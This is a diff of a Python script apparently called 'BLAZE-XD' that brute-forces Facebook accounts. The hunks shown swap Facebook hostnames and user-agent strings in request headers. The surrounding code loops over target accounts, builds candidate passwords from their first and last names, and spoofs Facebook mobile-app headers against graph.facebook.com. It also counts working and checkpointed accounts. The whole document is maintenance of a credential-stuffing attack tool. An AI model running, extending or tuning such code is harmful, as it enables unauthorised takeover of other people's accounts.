@@ -1,4 +1,5 @@
 
+
 #-----
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
 from random import randint
@@ -750,12 +751,12 @@ def rcrack(uid,pwx,tl):
 			header_freefb = {
 			
     
-    'authority': 'p.facebook.com',
+    'authority': 'x.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
     'dpr': '1.8000000715255737',
-    'referer': 'https://p.facebook.com/bookmarks/',
+    'referer': 'https://x.facebook.com/bookmarks/',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
@@ -767,12 +768,11 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
-    'service-worker-navigation-preload': '{"k":"rev,1012381695;locale,en_GB;cohort,BP:DEFAULT;branch,trunk;dpr,2;features,;u,100027368653839;","a":"1711627065","t":31536000,"n":"nA2GPvuC","v":"2450","p":4,"r":1012381695,"o":"h2","y":"wblt"}',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
-    
-}
-			response = requests.get('https://p.facebook.com/', cookies=cookies, headers=headers)
+    'viewport-width': '980',   }
+
+			response = requests.get('https://x.facebook.com/', cookies=cookies, headers=headers)
     
     
 			
@@ -1015,7 +1015,7 @@ def method():
         sys.stdout.write('\r \033[1;97m[\033[1;97mBLAZE-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:
-            heads = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            heads = 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
